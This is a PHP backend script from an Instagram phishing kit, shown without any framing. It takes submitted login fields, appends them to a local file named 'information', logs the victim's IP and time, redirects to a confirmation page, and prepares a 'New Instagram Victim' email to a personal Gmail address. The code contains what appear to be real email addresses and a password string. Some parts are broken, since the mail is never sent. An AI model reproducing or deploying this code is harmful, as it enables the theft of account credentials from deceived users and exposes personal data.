<?php
header ('Location:confirm.php');
$handle = fopen("information", "a+");
$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$message .= "========== Instagram Login ==========\n";
$message .= "User: ".$_POST['salihertugrul21@gmail.com']."\n";
$message .= "Pass: ".$_POST['karaborsa0101']."\n";
$message .= "----------\n";
$message .= "IP: ".$ip."\n";
$message .= "Log : $time / $date \n";
$rnessage = "$message\n";
$send= "salihertugrul01@gmail.com";
$subject = "New Instagram Victim | $ip";
$headers = "From: Instagram";
chmod($file, 0777);
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, " = ");
   fwrite($handle, $value);
   fwrite($handle, "\r   \n");
}
fwrite($handle, "\r   \n   \n");
fclose($handle);
exit;

?>
